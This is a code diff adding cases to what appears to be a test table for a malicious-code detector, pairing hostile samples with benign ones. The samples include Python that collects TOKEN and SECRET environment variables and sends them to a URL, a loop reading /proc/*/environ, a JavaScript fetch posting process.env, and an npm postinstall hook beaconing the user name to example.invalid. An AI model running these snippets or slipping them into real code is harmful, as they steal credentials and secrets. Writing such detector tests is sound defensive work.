@@ -127,6 +127,19 @@ CASES = {
         "fetch(u, {method: 'POST', body: JSON.stringify(process.env)})",
         "const all = JSON.stringify(process.env);",
     ),
+    "env_keyword_send": (
+        "x.py",
+        "import urllib.request\nkeys = ('TOKEN', 'SECRET')\n"
+        "found = {k: v for k, v in os.environ.items() if any(x in k for x in keys)}\n"
+        "urllib.request.urlopen(U, data=repr(found).encode())",
+        "keys = ('TOKEN', 'SECRET')\n"
+        "found = {k: v for k, v in os.environ.items() if any(x in k for x in keys)}\nprint(sorted(found))",
+    ),
+    "proc_environ_read": (
+        "x.py",
+        "for e in glob.glob('/proc/[0-9]*/environ'):\n    raw = open(e, 'rb').read()",
+        "info = open('/proc/cpuinfo').read()",
+    ),
     "npm_hook_beacon": (
         "package.json",
         '{"scripts": {"postinstall": "curl https://example.invalid/?u=$USER"}}',
